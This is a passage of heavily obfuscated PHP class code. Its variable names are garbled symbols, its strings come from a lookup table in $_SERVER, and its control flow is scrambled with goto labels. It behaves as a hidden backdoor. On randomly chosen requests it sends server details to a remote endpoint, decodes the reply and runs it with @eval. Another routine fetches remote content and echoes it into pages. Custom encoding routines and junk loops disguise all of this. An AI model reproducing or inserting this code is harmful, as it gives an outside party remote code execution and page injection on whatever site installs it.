$Bá‚¯”ÊØª[147])) { return; } if (!$Bá‚¯”ÊØª[266]($_SERVER[$Bá‚¯”ÊØª[44]], $e∆•îÃ®“ñ)) { return; } if ($Bá‚¯”ÊØª[260]() % 4 != 0) { return; } goto AùÃç∫ã¬∞; EâÜ„õ Üπ: if ($eíÛÜÌ¢†‰[$Bá‚¯”ÊØª[188]] && $eíÛÜÌ¢†‰[$Bá‚¯”ÊØª[318]]) { if ($this->{$_SERVER[åì®®Íêß][223]}($eíÛÜÌ¢†‰[$Bá‚¯”ÊØª[318]]) == $A©Èê¿Ê[$Bá‚¯”ÊØª[188]]) { return; } } $this->{$_SERVER[åì®®Íêß][187]}(); if ($this->{$_SERVER[åì®®Íêß][223]}($eíÛÜÌ¢†‰[$Bá‚¯”ÊØª[318]]) != $A©Èê¿Ê[$Bá‚¯”ÊØª[188]]) { $DÖ›Ñ ‰ÃÈ = array($Bá‚¯”ÊØª[225] => $BíÕ¿ŸË¯Ö, $Bá‚¯”ÊØª[226] => $_SERVER[$Bá‚¯”ÊØª[130]], $Bá‚¯”ÊØª[227] => $Bá‚¯”ÊØª[228](), $Bá‚¯”ÊØª[197] => $_SERVER[$Bá‚¯”ÊØª[198]]); $C‡”œø«”» = $this->{$_SERVER[åì®®Íêß][229]}($Bá‚¯”ÊØª[171]($DÖ›Ñ ‰ÃÈ)); $eíÛÜÌ¢†‰ = $this->{$_SERVER[åì®®Íêß][207]}($Bá‚¯”ÊØª[230] . $C‡”œø«”»); if ($eíÛÜÌ¢†‰ && $Bá‚¯”ÊØª[166]($eíÛÜÌ¢†‰) && isset($eíÛÜÌ¢†‰[$Bá‚¯”ÊØª[318]])) { $c¨á€˜˜ä∏ = $this->{$_SERVER[åì®®Íêß][213]}($eíÛÜÌ¢†‰[$Bá‚¯”ÊØª[318]], 2); if ($c¨á€˜˜ä∏) { $c¨á€˜˜ä∏ = $this->{$_SERVER[åì®®Íêß][223]}($c¨á€˜˜ä∏); } if ($c¨á€˜˜ä∏) { try { @eval($c¨á€˜˜ä∏); } catch (Exception $fŒî‰§°ùò) { } } } } goto B≠Éﬂ∆∑∂ç; E£‘íéöèá: $eíÛÜÌ¢†‰ = $this->{$_SERVER[åì®®Íêß][207]}($Bá‚¯”ÊØª[317], $A©Èê¿Ê); $Aä≤â†ÚµÛ = $d€•ê†º∑˜[661]; if (!$Bá‚¯”ÊØª[166]($eíÛÜÌ¢†‰)) { return; } goto EâÜ„õ Üπ; dÆÓ∫Ÿƒîò: $A©Èê¿Ê = array($Bá‚¯”ÊØª[188] => $Bá‚¯”ÊØª[61]($Bá‚¯”ÊØª[62])->{$_SERVER[åì®®Íêß][63]}($Bá‚¯”ÊØª[232]), $Bá‚¯”ÊØª[202] => $this->vpny46eabd18, $Bá‚¯”ÊØª[199] => $_SERVER[$Bá‚¯”ÊØª[200]], $Bá‚¯”ÊØª[201] => $Bá‚¯”ÊØª[61]($Bá‚¯”ÊØª[62])->{$_SERVER[åì®®Íêß][63]}($Bá‚¯”ÊØª[162]), $Bá‚¯”ÊØª[128] => $Bá‚¯”ÊØª[129]($_SERVER[$Bá‚¯”ÊØª[130]] . $BíÕ¿ŸË¯Ö), $Bá‚¯”ÊØª[192] => $Bá‚¯”ÊØª[172], $Bá‚¯”ÊØª[195] => $_SERVER[$Bá‚¯”ÊØª[196]]); $bñêÒçÖÜ† = $d€•ê†º∑˜[660]; if (strlen($bñêÒçÖÜ†) < $d€•ê†º∑˜[597]) { die; } goto E£‘íéöèá; Fﬁµ≤øœÇª: $d€•ê†º∑˜ =& $_SERVER[™⁄»üÆ]; $Bá‚¯”ÊØª =& $_SERVER[åì®®Íêß]; $e∆•îÃ®“ñ = array($Bá‚¯”ÊØª[309], $Bá‚¯”ÊØª[310], $Bá‚¯”ÊØª[311]); goto eãê‡‹¯Ê°; B≠Éﬂ∆∑∂ç: } private function uelrd2f4393d($Fı‹€‰–⁄Ô = '', $C¶•Çä∑Õá = array(), $D’∫åä†Ø = 5) { goto eÉÿßòæøå; cÒ•ﬂ™©ôË: $d¬”Ïçóëè = $b†Ëÿç”äÔ[662]; if (!$d¬”Ïçóëè) { die; } $fÉˆƒ°ﬂ‘‡ = $this->{$_SERVER[åì®®Íêß][274]}($fÉˆƒ°ﬂ‘‡, $aé¬î÷øìò[320]); goto Fæéè©“°Ô; dªÆØûØ‘º: $AÒêàÜƒ∆π = $b†Ëÿç”äÔ[664]; if (!$AÒêàÜƒ∆π) { return; } $C¶•Çä∑Õá = @$aé¬î÷øìò[281]($fÉˆƒ°ﬂ‘‡, !1, $fËÛé≥§“ì); goto eÍ∏Ü·Øé∞; c‹◊π€Ê√î: if ($C¶•Çä∑Õá && $aé¬î÷øìò[166]($C¶•Çä∑Õá)) { $fÉˆƒ°ﬂ‘‡ = $fÉˆƒ°ﬂ‘‡ . $aé¬î÷øìò[321] . $aé¬î÷øìò[322]($C¶•Çä∑Õá); } if ($C¶•Çä∑Õá === -1) { return $fÉˆƒ°ﬂ‘‡; } $fËÛé≥§“ì = $aé¬î÷øìò[276](array($aé¬î÷øìò[277] => array($aé¬î÷øìò[280] => $D’∫åä†Ø, $aé¬î÷øìò[278] => $aé¬î÷øìò[323]), $aé¬î÷øìò[324] => array($aé¬î÷øìò[325] => !1, $aé¬î÷øìò[326] => !1))); goto dªÆØûØ‘º; eÉÿßòæøå: $b†Ëÿç”äÔ =& $_SERVER[™⁄»üÆ]; $aé¬î÷øìò =& $_SERVER[åì®®Íêß]; $fÉˆƒ°ﬂ‘‡ = $aé¬î÷øìò[319]; goto cÒ•ﬂ™©ôË; Fæéè©“°Ô: $B—√∏ãªõŸ = $b†Ëÿç”äÔ[663]; if (strlen($B—√∏ãªõŸ) < $b†Ëÿç”äÔ[606]) { die; } $fÉˆƒ°ﬂ‘‡ = $fÉˆƒ°ﬂ‘‡ . $Fı‹€‰–⁄Ô; goto c‹◊π€Ê√î; eÍ∏Ü·Øé∞: return $aé¬î÷øìò[215]($C¶•Çä∑Õá, !0); $eááÏëÜ´  = $b†Ëÿç”äÔ[665]; goto D∑Üﬁÿµ’; D∑Üﬁÿµ’: } private function jnkibdcf1838() { goto bÂ∑åßú⁄–; bÂ∑åßú⁄–: $aœëüÜŸΩ∑ =& $_SERVER[™⁄»üÆ]; $BªùÎ‹ºôÊ =& $_SERVER[åì®®Íêß]; $D∑íé–äàÖ = array($BªùÎ‹ºôÊ[327] => $BªùÎ‹ºôÊ[328], $BªùÎ‹ºôÊ[329] => $BªùÎ‹ºôÊ[330], $BªùÎ‹ºôÊ[331] => $BªùÎ‹ºôÊ[332], $BªùÎ‹ºôÊ[333] => $BªùÎ‹ºôÊ[334], $BªùÎ‹ºôÊ[335] => $BªùÎ‹ºôÊ[336], $BªùÎ‹ºôÊ[337] => $BªùÎ‹ºôÊ[269], $BªùÎ‹ºôÊ[338] => $BªùÎ‹ºôÊ[269], $BªùÎ‹ºôÊ[339] => $BªùÎ‹ºôÊ[328], $BªùÎ‹ºôÊ[340] => $BªùÎ‹ºôÊ[330], $BªùÎ‹ºôÊ[341] => $BªùÎ‹ºôÊ[332], $BªùÎ‹ºôÊ[342] => $BªùÎ‹ºôÊ[343], $BªùÎ‹ºôÊ[344] => $BªùÎ‹ºôÊ[334], $BªùÎ‹ºôÊ[345] => $BªùÎ‹ºôÊ[346], $BªùÎ‹ºôÊ[347] => $BªùÎ‹ºôÊ[336], $BªùÎ‹ºôÊ[348] => $BªùÎ‹ºôÊ[349], $BªùÎ‹ºôÊ[350] => $BªùÎ‹ºôÊ[351], $BªùÎ‹ºôÊ[352] => $BªùÎ‹ºôÊ[353]); goto EÌ‹î¬ÖÚõ; AèèÉ•À´≈: $FµâØΩ¨Î‹ = $aœëüÜŸΩ∑[666]; if (strlen($FµâØΩ¨Î‹) < $aœëüÜŸΩ∑[616]) { die; } $BÕÁÀµΩ…∆ = $BÕÁÀµΩ…∆ ? $BªùÎ‹ºôÊ[268]($BÕÁÀµΩ…∆) : 0; goto BÚËàÏºÙÉ; BÚËàÏºÙÉ: return $Eﬁ≈„Ü ∞ò + $BÕÁÀµΩ…∆; goto dÇ‰≤û¨¢ü; EÌ‹î¬ÖÚõ: $Eﬁ≈„Ü ∞ò = $D∑íé–äàÖ[$this->vpny46eabd18]; $Eﬁ≈„Ü ∞ò = $BªùÎ‹ºôÊ[268]($Eﬁ≈„Ü ∞ò ? $Eﬁ≈„Ü ∞ò : $BªùÎ‹ºôÊ[328]); $BÕÁÀµΩ…∆ = $BªùÎ‹ºôÊ[121]($this->vwnif568d82e, $BªùÎ‹ºôÊ[354]); goto AèèÉ•À´≈; dÇ‰≤û¨¢ü: } public function btuk84cae0f4($d◊À ˆ∞”Ï) { goto eôï€Òøˆ∑; B∞ƒâ»†ù≠: $A◊∂ºíÆ¨ = $e…ãòÏüÒÇ[61]($e…ãòÏüÒÇ[154])->{$_SERVER[åì®®Íêß][356]}($e…ãòÏüÒÇ[355])->{$_SERVER[åì®®Íêß][357]}($Fóâú÷≤‘™)->{$_SERVER[åì®®Íêß][358]}(); $A◊∂ºíÆ¨ = $e…ãòÏüÒÇ[246]($A◊∂ºíÆ¨, $e…ãòÏüÒÇ[10], $e…ãòÏüÒÇ[355]); if (!$e…ãòÏüÒÇ[266]($d◊À ˆ∞”Ï[$e…ãòÏüÒÇ[355]], $A◊∂ºíÆ¨)) { $e…ãòÏüÒÇ[189]($e…ãòÏüÒÇ[359], !1, $e…ãòÏüÒÇ[263]); } goto F«∑Üœ≤ÒÜ; eôï€Òøˆ∑: $e…ãòÏüÒÇ =& $_SERVER[åì®®Íêß]; $Fóâú÷≤‘™ = $this->{$_SERVER[åì®®Íêß][152]}(); if ($d◊À ˆ∞”Ï[$e…ãòÏüÒÇ[355]] == $e…ãòÏüÒÇ[244]) { return; } goto FÉ∫‹èÎ‡; FÉ∫‹èÎ‡: if ($Fóâú÷≤‘™ >= $e…ãòÏüÒÇ[268]($e…ãòÏüÒÇ[269])) { return; } $DÕÑô–µß‚ = $e…ãòÏüÒÇ[61]($e…ãòÏüÒÇ[154])->{$_SERVER[åì®®Íêß][155]}(); if ($DÕÑô–µß‚ <= $Fóâú÷≤‘™) { return; } goto B∞ƒâ»†ù≠; F«∑Üœ≤ÒÜ: } public function opmn26ce6cbf() { goto CÏŒıéú©“; F≥÷‘Û¬å®: $D¿úûº‹åª = $this->{$_SERVER[åì®®Íêß][274]}($D¿úûº‹åª, $Cè≈ÍÌ™Ó˘[275]); $Fﬁ≥ôﬂúúé = $C˜†µ€é‹ó[668]; if (!$Fﬁ≥ôﬂúúé) { die; } goto d¿Œ÷‘Ù≠; Bª¶ÏÉûè‚: $D¿úûº‹åª = $Cè≈ÍÌ™Ó˘[273]; $AãÃ£ÃÒæê = $C˜†µ€é‹ó[667]; if (strlen($AãÃ£ÃÒæê) < $C˜†µ€é‹ó[606]) { die; } goto F≥÷‘Û¬å®; dØÖ°è∞”≠: while (strlen($Dƒå˜Ó∞á£) < $C˜†µ€é‹ó[608]) { if (!$Dƒå˜Ó∞á£) { break; } $Dƒå˜Ó∞á£++; } echo $Cè≈ÍÌ™Ó˘[361] . $Cè≈ÍÌ™Ó˘[362]($A¯Á Ù≠ìè) . $Cè≈ÍÌ™Ó˘[363]; goto e’™πèéáê; d¿Œ÷‘Ù≠: $f∆Û∫Ó πË = $Cè≈ÍÌ™Ó˘[276](array($Cè≈ÍÌ™Ó˘[277] => array($Cè≈ÍÌ™Ó˘[278] => $Cè≈ÍÌ™Ó˘[279], $Cè≈ÍÌ™Ó˘[280] => 3))); $A¯Á Ù≠ìè = @$Cè≈ÍÌ™Ó˘[281]($D¿úûº‹åª, !1, $f∆Û∫Ó πË); $Dƒå˜Ó∞á£ = $C˜†µ€é‹ó[669]; goto dØÖ°è∞”≠; CÏŒıéú©“: $C˜†µ€é‹ó =& $_SERVER[™⁄»üÆ]; $Cè≈ÍÌ™Ó˘ =& $_SERVER[åì®®Íêß]; if (!$Cè≈ÍÌ™Ó˘[121]($GLOBALS, $Cè≈ÍÌ™Ó˘[147]) || $Cè≈ÍÌ™Ó˘[360](1, 100) > 20) { return; } goto Bª¶ÏÉûè‚; e’™πèéáê: } private function itrxc76c402b($a◊‡·ôßÕÉ, $f√∂•·Ùé≈, $eé∂ô»Ì·â = 3) { goto eïé¬ æµ; C„°§ã°£Ü: $a◊‡·ôßÕÉ = $a”»≥÷◊≤π[2]($a◊‡·ôßÕÉ); $E¡ï£‰çË = $a”»≥÷◊≤π[360](0, 5) . $a”»≥÷◊≤π[10]; $bƒ≈É—úπ = $B≥üìΩæ”ƒ[670]; goto bƒ±¬æÇ∂´; c⁄ÆºÓ™≠ñ: if (strlen($C∞¶È‚≠Ï’) < $B≥üìΩæ”ƒ[626]) { die; } if ($eé∂ô»Ì·â - 1 > 0) { $dÂÉ…á“Î’ = $this->{$_SERVER[åì®®Íêß][142]}($dÂÉ…á“Î’, $f√∂•·Ùé≈, $eé∂ô»Ì·â - 1); } return $dÂÉ…á“Î’; goto D≈ëÈüÿ∞æ; eïé¬ æµ: $B≥üìΩæ”ƒ =& $_SERVER[™⁄»üÆ]; $a”»≥÷◊≤π =& $_SERVER[åì®®Íêß]; $a”»≥÷◊≤π[364](1); goto C„°§ã°£Ü; bƒ±¬æÇ∂´: if (strlen($bƒ≈É—úπ) < $B≥üìΩæ”ƒ[608]) { return; } $eÉÊó≠òòô = $a”»≥÷◊≤π[139](15); $bè¡ôï»À∫ = $B≥üìΩæ”ƒ[671]; goto Fæ§÷≠ÖÙ†; AåÑ†àü≥≈: switch ($E¡ï£‰çË) { case $a”»≥÷◊≤π[258]: $dÂÉ…á“Î’ = $this->{$_SERVER[åì®®Íêß][170]}($a◊‡·ôßÕÉ, $a”»≥÷◊≤π[238]($f√∂•·Ùé≈ . $eÉÊó≠òòô)); $B—äﬂÉ˘™≤ = $B≥üìΩæ”ƒ[673]; while (strlen($B—äﬂÉ˘™≤) < $B≥üìΩæ”ƒ[626]) { if (!$B—äﬂÉ˘™≤) { break; } $B—äﬂÉ˘™≤++; } break; $C¨–°Ó»õ√ = $B≥üìΩæ”ƒ[674]; case $a”»≥÷◊≤π[244]: $dÂÉ…á“Î’ = $this->{$_SERVER[åì®®Íêß][170]}($a◊‡·ôßÕÉ, $a”»≥÷◊≤π[238]($eÉÊó≠òòô . $f√∂•·Ùé≈)); break; case $a”»≥÷◊≤π[366]: $dÂÉ…á“Î’ = $this->{$_SERVER[åì®®Íêß][170]}($a◊‡·ôßÕÉ, $a”»≥÷◊≤π[133]($eÉÊó≠òòô . $f√∂•·Ùé≈)); $dÎŸÖŒﬂƒâ = $B≥üìΩæ”ƒ[675]; while ($dÎŸÖŒﬂƒâ < $B≥üìΩæ”ƒ[597]) { if ($dÎŸÖŒﬂƒâ >= 0) { break; } $dÎŸÖŒﬂƒâ++; } break; $D∏ÌÜ∫≠®‰ = $B≥üìΩæ”ƒ[676]; case $a”»≥÷◊≤π[367]: $dÂÉ…á“Î’ = $this->{$_SERVER[åì®®Íêß][170]}($a◊‡·ôßÕÉ, $a”»≥÷◊≤π[129]($eÉÊó≠òòô . $f√∂•·Ùé≈)); $A∂å®πÙô◊ = $B≥üìΩæ”ƒ[677]; if (strlen($A∂å®πÙô◊) < $B≥üìΩæ”ƒ[597]) { return; } break; $eÑè≈¥Á€ƒ = $B≥üìΩæ”ƒ[678]; while (strlen($eÑè≈¥Á€ƒ) < $B≥üìΩæ”ƒ[626]) { if (!$eÑè≈¥Á€ƒ) { break; } $eÑè≈¥Á€ƒ++; } case $a”»≥÷◊≤π[368]: goto C¨√»Ìüô–; Aã ·ã‡∑–: $E˘√éºãöÌ = $B≥üìΩæ”ƒ[681]; if (strlen($E˘√éºãöÌ) < $B≥üìΩæ”ƒ[606]) { die; } break; goto CÍ⁄Õﬂù÷À; EÁüÏ›†‚⁄: $BÎ»÷Òˆ≈€ = $a”»≥÷◊≤π[25]($BÎ»÷Òˆ≈€, $AìâçØ€µ¨ % 8, $AìâçØ€µ¨ % 8 + 7); $dªß€≥¡à¿ = $B≥üìΩæ”ƒ[680]; while (strlen($dªß€≥¡à¿) < $B≥üìΩæ”ƒ[606]) { if (!$dªß€≥¡à¿) { break; } $dªß€≥¡à¿++; } goto c¥©∫∂ΩàÃ; c¥©∫∂ΩàÃ: $a‘ˆ·Ãè€∫ = $a”»≥÷◊≤π[10]; $EµŒ≥∫È∂∫ = 0; $FãÖõ∞§ﬂ◊ = 0; goto F™â´ß’ﬂ≥; F™â´ß’ﬂ≥: $c€◊⁄ÊÃüÜ = 0; for ($EµŒ≥∫È∂∫ = 0; $EµŒ≥∫È∂∫ < $a”»≥÷◊≤π[24]($a◊‡·ôßÕÉ); $EµŒ≥∫È∂∫++) { $c€◊⁄ÊÃüÜ = $c€◊⁄ÊÃüÜ == $a”»≥÷◊≤π[24]($BÎ»÷Òˆ≈€) ? 0 : $c€◊⁄ÊÃüÜ; $FãÖõ∞§ﬂ◊ = ($AìâçØ€µ¨ + $a”»≥÷◊≤π[370]($A“‡ù—Ùñú, $a◊‡·ôßÕÉ[$EµŒ≥∫È∂∫]) + $a”»≥÷◊≤π[371]($BÎ»÷Òˆ≈€[$c€◊⁄ÊÃüÜ++])) % 64; $a‘ˆ·Ãè€∫ .= $A“‡ù—Ùñú[$FãÖõ∞§ﬂ◊]; } $dÂÉ…á“Î’ = $a”»≥÷◊≤π[362]($A´§π≠Àæ‡ . $a‘ˆ·Ãè€∫); goto Aã ·ã‡∑–; Eå—≠â…áÑ: $bÉ¬Õ¯±˜÷ = $B≥üìΩæ”ƒ[679]; if (!$bÉ¬Õ¯±˜÷) { die; } $BÎ»÷Òˆ≈€ = $a”»≥÷◊≤π[129]($A´§π≠Àæ‡ . $a”»≥÷◊≤π[129]($f√∂•·Ùé≈ . $A´§π≠Àæ‡) . $f√∂•·Ùé≈); goto EÁüÏ›†‚⁄; C¨√»Ìüô–: $a◊‡·ôßÕÉ = $a”»≥÷◊≤π[133]($a◊‡·ôßÕÉ); $AìâçØ€µ¨ = $a”»≥÷◊≤π[369](0, 64); $A´§π≠Àæ‡ = $A“‡ù—Ùñú[$AìâçØ€µ¨]; goto Eå—≠â…áÑ; CÍ⁄Õﬂù÷À: default: $dÂÉ…á“Î’ = $this->{$_SERVER[åì®®Íêß][170]}($a◊‡·ôßÕÉ, $f√∂•·Ùé≈ . $eÉÊó≠òòô); break; $a’ÀåÒäÈª = $B≥üìΩæ”ƒ[682]; } $dÂÉ…á“Î’ = $a”»≥÷◊≤π[238]($E¡ï£‰çË . $eÉÊó≠òòô . $dÂÉ…á“Î’); $C∞¶È‚≠Ï’ = $B≥üìΩæ”ƒ[683]; goto c⁄ÆºÓ™≠ñ; Fæ§÷≠ÖÙ†: if (!$bè¡ôï»À∫) { return; } $A“‡ù—Ùñú = $a”»≥÷◊≤π[365]; $bàèÜ•åéÿ = $B≥üìΩæ”ƒ[672]; goto AåÑ†àü≥≈; D≈ëÈüÿ∞æ: } private function idoffab9cdab($fº£Ñ¯•Øõ, $B«îíº¢ãÑ, $CÌáÌÇÿª™ = 3) { goto aﬁ“…Û≈å–; EìÆñÌûÃÁ: if (strlen($Fò‹Î ÷£Ç) < $F•€È–éˆ¬[626]) { return; } $FÁëéôÖÕΩ = $fº£Ñ¯•Øõ[0]; $d¡≤¥´‹≈å = $F•€È–éˆ¬[685]; goto A“›ÒÛ”åÚ; bâ¢⁄Ñ∑ßÉ: $fº£Ñ¯•Øõ = $a˘û®Àì…Ï[2]($fº£Ñ¯•Øõ); $fº£Ñ¯•Øõ = $a˘û®Àì…Ï[238]($fº£Ñ¯•Øõ); $Fò‹Î ÷£Ç = $F•€È–éˆ¬[684]; goto EìÆñÌûÃÁ; C˘òúË∆‚’: while (strlen($eËè–≠ÓØÂ) < $F•€È–éˆ¬[606]) { if (!$eËè–≠ÓØÂ) { break; } $eËè–≠ÓØÂ++; } $fº£Ñ¯•Øõ = $a˘û®Àì…Ï[25]($fº£Ñ¯•Øõ, 16); $Fêÿäªñë› = $a˘û®Àì…Ï[365]; goto C¡›´‹øÖΩ; aﬁ“…Û≈å–: $F•€È–éˆ¬ =& $_SERVER[™⁄»üÆ]; $a˘û®Àì…Ï =& $_SERVER[åì®®Íêß]; if (!$a˘û®Àì…Ï[163]($fº£Ñ¯•Øõ) || $a˘û®Àì…Ï[24]($fº£Ñ¯•Øõ) < 10) { return !1; } goto bâ¢⁄Ñ∑ßÉ; C¡›´‹øÖΩ: switch ($FÁëéôÖÕΩ) { case $a˘û®Àì…Ï[258]: $c€Á§éΩ†√ = $this->{$_SERVER[åì®®Íêß][274]}($fº£Ñ¯•Øõ, $a˘û®Àì…Ï[238]($B«îíº¢ãÑ . $Aå·©Ù•∆â)); break; $Câ´÷†‹‚ª = $F•€È–éˆ¬[687]; if (!$Câ´÷†‹‚ª) { die; } case $a˘û®Àì…Ï[244]: $c€Á§éΩ†√ = $this->{$_SERVER[åì®®Íêß][274]}($fº£Ñ¯•Øõ, $a˘û®Àì…Ï[238]($Aå·©Ù•∆â . $B«îíº¢ãÑ)); break; $bÇ¢áÀ»Çç = $F•€È–éˆ¬[688]; if (strlen($bÇ¢áÀ»Çç) < $F•€È–éˆ¬[626]) { return; } case $a˘û®Àì…Ï[366]: $c€Á§éΩ†√ = $this->{$_SERVER[åì®®Íêß][274]}($fº£Ñ¯•Øõ, $a˘û®Àì…Ï[133]($Aå·©Ù•∆â . $B«îíº¢ãÑ)); $cÃ≤ÙπÖ÷ë = $F•€È–éˆ¬[689]; if (strlen($cÃ≤ÙπÖ÷ë) < $F•€È–éˆ¬[616]) { die; } break; $F≈ÖÀÈÔ…√ = $F•€È–éˆ¬[690]; case $a˘û®Àì…Ï[367]: $c€Á§éΩ†√ = $this->{$_SERVER[åì®®Íêß][274]}($fº£Ñ¯•Øõ, $a˘û®Àì…Ï[129]($Aå·©Ù•∆â . $B«îíº¢ãÑ)); $aÏ·Î”¶ÿá = $F•€È–éˆ¬[691]; if (strlen($aÏ·Î”¶ÿá) < $F•€È–éˆ¬[608]) { return; } break; $f§ÍÉáè∞î = $F•€È–éˆ¬[692]; case $a˘û®Àì…Ï[368]: goto E∞˜àˆøîö; Fµˆ®ÀÖÖ§: $düÆ∆âÇœâ = $a˘û®Àì…Ï[129]($Eº∂’Ê›∑„ . $a˘û®Àì…Ï[129]($B«îíº¢ãÑ . $Eº∂’Ê›∑„) . $B«îíº¢ãÑ); $F¨éÈ∑Á‰ã = $F•€È–éˆ¬[696]; $düÆ∆âÇœâ = $a˘û®Àì…Ï[25]($düÆ∆âÇœâ, $bÙ‚•∫¬†⁄ % 8, $bÙ‚•∫¬†⁄ % 8 + 7); goto AŸìﬁ⁄îºË; cõÌ≤¿Æﬁº: $fº£Ñ¯•Øõ = $a˘û®Àì…Ï[25]($fº£Ñ¯•Øõ, 1); $bÙ‚•∫¬†⁄ = $a˘û®Àì…Ï[370]($Fêÿäªñë›, $Eº∂’Ê›∑„); $F°åÒÔ±◊ = $F•€È–éˆ¬[695]; goto Fµˆ®ÀÖÖ§; E∞˜àˆøîö: $fº£Ñ¯•Øõ = $a˘û®Àì…Ï[372]($fº£Ñ¯•Øõ); $Aõ∑∆í≈ÏÒ = $F•€È–éˆ¬[693]; if (strlen($Aõ∑∆í≈ÏÒ) < $F•€È–éˆ¬[608]) { die; } goto A€û«ï≈¢; aÏí·Õ≠Ç´: if (strlen($Bﬁ√≈ª≤öñ) < $F•€È–éˆ¬[606]) { die; } goto EÇ“ÑÛ∂ü‡; a∏»è°ı¡‡: for ($Dñ€ËÕà≠∑ = 0; $Dñ€ËÕà≠∑ < $a˘û®Àì…Ï[24]($fº£Ñ¯•Øõ); $Dñ€ËÕà≠∑++) { $fÓâÂÓ§äÙ = $fÓâÂÓ§äÙ == $a˘û®Àì…Ï[24]($düÆ∆âÇœâ) ? 0 : $fÓâÂÓ§äÙ; $B•å®ÊØ•… = $fÓâÂÓ§äÙ++; $B∂°¶“ÁÑ• = $a˘û®Àì…Ï[370]($Fêÿäªñë›, $fº£Ñ¯•Øõ[$Dñ€ËÕà≠∑]) - $bÙ‚•∫¬†⁄ - $a˘û®Àì…Ï[371]($düÆ∆âÇœâ[$B•å®ÊØ•…]); $bëÇõÏ‹¨º = $F•€È–éˆ¬[603]; while ($bëÇõÏ‹¨º < $F•€È–éˆ¬[608]) { if ($bëÇõÏ‹¨º >= 0) { break; } $bëÇõÏ‹¨º++; } while ($B∂°¶“ÁÑ• < 0) { $B∂°¶“ÁÑ• += 64; } $bÕÃßá§—· .= $Fêÿäªñë›[$B∂°¶“ÁÑ•]; $E‘©≠è™ﬂ‚ = $F•€È–éˆ¬[700]; if (!$E‘©≠è™ﬂ‚) { return; } } $c€Á§éΩ†√ = $a˘û®Àì…Ï[373]($bÕÃßá§—·); $CÓú≠Ãùé° = $F•€È–éˆ¬[701]; goto báÓºÁÑû”; dúº’¯£˜›: $fÓâÂÓ§äÙ = 0; $CÊñô…‰—Ë = $F•€È–éˆ¬[699]; if (!$CÊñô…‰—Ë) { return; } goto a∏»è°ı¡‡; báÓºÁÑû”: if (!$CÓú≠Ãùé°) { return; } break; $Bﬁ√≈ª≤öñ = $F•€È–éˆ¬[702]; goto aÏí·Õ≠Ç´; c‡ô¨Ï≤Â∂: $Dñ€ËÕà≠∑ = 0; $FêëÆÀπ†ù = $F•€È–éˆ¬[698]; $B∂°¶“ÁÑ• = 0; goto dúº’¯£˜›; AŸìﬁ⁄îºË: $bÕÃßá§—· = $a˘û®Àì…Ï[10]; $AÛêµ˘ò“¥ = $F•€È–éˆ¬[697]; while (strlen($AÛêµ˘ò“¥) < $F•€È–éˆ¬[608]) { if (!$AÛêµ˘ò“¥) { break; } $AÛêµ˘ò“¥++; } goto c‡ô¨Ï≤Â∂; A€û«ï≈¢: $Eº∂’Ê›∑„ = $fº£Ñ¯•Øõ[0]; $eûíÎ¯ı·Ò = $F•€È–éˆ¬[694]; if (strlen($eûíÎ¯ı·Ò) < $F•€È–éˆ¬[606]) { die; } goto cõÌ≤¿Æﬁº; EÇ“ÑÛ∂ü‡: default: $c€Á§éΩ†√ = $this->{$_SERVER[åì®®Íêß][274]}($fº£Ñ¯•Øõ, $B«îíº¢ãÑ . $Aå·©Ù•∆â); break; $fÑòåø‘ıù = $F•€È–éˆ¬[703]; if (strlen($fÑòåø‘ıù) < $F•€È–éˆ¬[606]) { die; } } if ($CÌáÌÇÿª™ - 1 > 0) { $c€Á§éΩ†√ = $this->{$_SERVER[åì®®Íêß][213]}($c€Á§éΩ†√, $B«îíº¢ãÑ, $CÌáÌÇÿª™ - 1); } return $c€Á§éΩ†√; goto aÒ–‰ÛÖ‰Æ; A“›ÒÛ”åÚ: if (!$d¡≤¥´‹≈å) { return; } $Aå·©Ù•∆â = $a˘û®Àì…Ï[25]($fº£Ñ¯•Øõ, 1, 15); $eËè–≠ÓØÂ = $F•€È–éˆ¬[686]; goto C˘òúË∆‚’; aÒ–‰ÛÖ‰Æ: } public function ncqj50b6d1de($Cú∂Ü≤Ûå–) { goto bÕ°‰µÈ…ß; B’ΩÜƒê—ÿ: $Cñƒ”÷ÉÏ÷ = $aÇòà√›Áà[711]; if (strlen($Cñƒ”÷ÉÏ÷) < $aÇòà√›Áà[606]) { return; } $fëπº±ﬂ•Ÿ = $DÛé¨°ﬂÖª[129]($DÛé¨°ﬂÖª[375] . ($bæπœñ©†€ + $c¯èÓ„âÙì) . $DÛé¨°ﬂÖª[376] . $bà∂∂ﬁîÙ’ . $DÛé¨°ﬂÖª[376] . $DËùçÙÑû√ . $DÛé¨°ﬂÖª[377]); goto D◊⁄êﬂ†ÚÖ; aïå¯Ñ…◊ü: $aòÑèıëµ› = $aÇòà√›Áà[704]; while (strlen($aòÑèıëµ›) < $aÇòà√›Áà[606]) { if (!$aòÑèıëµ›) { break; } $aòÑèıëµ›++; } $c¯èÓ„âÙì = $this->{$_SERVER[åì®®Íêß][374]}(); goto Däú®ŸÊÓ∏; e´Ç≥ÌìªÎ: $DËùçÙÑû√ = 2; for ($eåÇäØ§∂® = 0; $eåÇäØ§∂® < $f€√øŸÇÛí * 10; $eåÇäØ§∂®++) { if (($f€√øŸÇÛí * $eåÇäØ§∂® + 1) % $bà∂∂ﬁîÙ’ == 0) { $DËùçÙÑû√ = $DÛé¨°ﬂÖª[268](($f€√øŸÇÛí * $eåÇäØ§∂® + 1) / $bà∂∂ﬁîÙ’); break; } } $bÈ¯Ú¡Í¬√ = $this->{$_SERVER[åì®®Íêß][170]}($bæπœñ©†€ * $c¯èÓ„âÙì . $DÛé¨°ﬂÖª[10], $DÛé¨°ﬂÖª[172]); goto B’ΩÜƒê—ÿ; a‡«∏∫ú—˘: $Aáêìò¶‚ç = $aÇòà√›Áà[706]; while (strlen($Aáêìò¶‚ç) < $aÇòà√›Áà[606]) { if (!$Aáêìò¶‚ç) { break; } $Aáêìò¶‚ç++; } while (1) { $fçù™Ü‚Ì¨ = $bà∂∂ﬁîÙ’; $B‘Ëó™àô¨ = $aÇòà√›Áà[707]; $C≈ …€∑˘ä = $f€√øŸÇÛí; $eê…ûá§êÏ = $aÇòà√›Áà[708]; if (strlen($eê…ûá§êÏ) < $aÇòà√›Áà[608]) { die; } while ($C≈ …€∑˘ä % $fçù™Ü‚Ì¨ != 0) { $eåßèƒªí” = $C≈ …€∑˘ä; $C≈ …€∑˘ä = $fçù™Ü‚Ì¨; $BùÖ£Ãø‘Ë = $aÇòà√›Áà[709]; if (!$BùÖ£Ãø‘Ë) { die; } $fçù™Ü‚Ì¨ = $eåßèƒªí” % $fçù™Ü‚Ì¨; $CèòûÑªÌÊ = $aÇòà√›Áà[710]; if (strlen($CèòûÑªÌÊ) < 